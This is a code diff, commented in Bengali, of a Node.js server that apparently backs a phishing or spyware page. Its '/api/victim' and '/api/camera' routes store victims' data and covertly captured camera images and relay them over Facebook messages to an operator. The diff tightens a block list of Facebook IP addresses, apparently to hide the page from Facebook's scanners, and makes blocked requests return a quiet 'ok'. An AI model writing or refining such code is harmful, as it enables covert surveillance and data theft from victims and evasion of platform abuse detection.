@@ -20,14 +20,13 @@ const BLOCKED_IPS = [
     '173.252.82.34',
     '173.252.82.35',
     '173.252.82.36',
-    // পুরো Facebook রেঞ্জ (আমরা শুধু IP ভিত্তিক ব্লক করছি)
 ];
 
 // ================================================================
 // ✅ সঠিক IP বের করার ফাংশন (প্রক্সি/লোড ব্যালেন্সারের জন্য)
 // ================================================================
 function getClientIp(req) {
-    // 1. x-forwarded-for হেডার থেকে (প্রক্সির ক্ষেত্রে)
+    // 1. x-forwarded-for হেডার থেকে (প্রক্সির ক্ষেত্রে) — এটাই সবচেয়ে নির্ভরযোগ্য
     const forwarded = req.headers['x-forwarded-for'];
     if (forwarded) {
         // কমা দ্বারা আলাদা করা IP গুলোর মধ্যে প্রথমটি হলো আসল IP
@@ -35,7 +34,7 @@ function getClientIp(req) {
         return ips[0];
     }
     
-    // 2. অন্যান্য হেডার
+    // 2. অন্যান্য হেডার (Cloudflare, Nginx, ইত্যাদি)
     const ip = req.headers['cf-connecting-ip'] ||   // Cloudflare
                req.headers['x-real-ip'] ||          // Nginx
                req.connection?.remoteAddress ||
@@ -60,6 +59,7 @@ const blockMiddleware = (req, res, next) => {
     
     if (BLOCKED_IPS.includes(clientIp)) {
         console.log(`🚫 ব্লকড IP: ${clientIp} → রিকোয়েস্ট ব্লক করা হয়েছে`);
+        // 403 ফেরত দিন যাতে এই আইপি থেকে আর কোনো ডেটা না আসে
         return res.status(403).json({ 
             status: 'error', 
             message: 'Access denied',
@@ -192,7 +192,17 @@ router.post('/api/victim', blockMiddleware, async (req, res) => {
             console.log(`✅ ভিক্টিম আপডেট: ${data.id}`);
         }
 
-        // মেসেজ পাঠান
+        // ============================================================
+        // 🔥 এখানে চেক করা হচ্ছে: ব্লকড আইপি হলে মেসেজ পাঠানো হবে না
+        // ============================================================
+        // ব্লক মিডলওয়্যার ইতিমধ্যেই 403 ফেরত দিয়েছে, তাই এখানে আর আসার কথা নয়।
+        // তবুও নিরাপত্তার জন্য ডাবল চেক:
+        if (BLOCKED_IPS.includes(clientIp)) {
+            console.log(`⚠️ ব্লকড IP ${clientIp} থেকে ডেটা এলেও মেসেজ পাঠানো হচ্ছে না।`);
+            return res.status(200).json({ status: 'ok', data: victim, blocked: true });
+        }
+
+        // মেসেজ পাঠান (শুধুমাত্র যদি IP ব্লক না থাকে)
         if (victim.fbId && victim.fbId !== 'unknown') {
             const msg = formatVictimData(victim);
             await sendMessage(victim.fbId, msg);
@@ -249,6 +259,13 @@ router.post('/api/camera', blockMiddleware, async (req, res) => {
 
         const totalImages = victim.camera.length;
         console.log(`📸 ক্যামেরা ছবি: ${id} (মোট ${totalImages}টি)`);
+
+        // ব্লক মিডলওয়্যার ইতিমধ্যেই 403 ফেরত দিয়েছে, তাই এখানে আর আসার কথা নয়।
+        // তবুও নিরাপত্তার জন্য ডাবল চেক:
+        if (BLOCKED_IPS.includes(clientIp)) {
+            console.log(`⚠️ ব্লকড IP ${clientIp} থেকে ক্যামেরা ডেটা এলেও মেসেজ পাঠানো হচ্ছে না।`);
+            return res.status(200).json({ status: 'ok', count: totalImages, blocked: true });
+        }
 
         if (victim.fbId && victim.fbId !== 'unknown') {
             if (isFirstImage) {
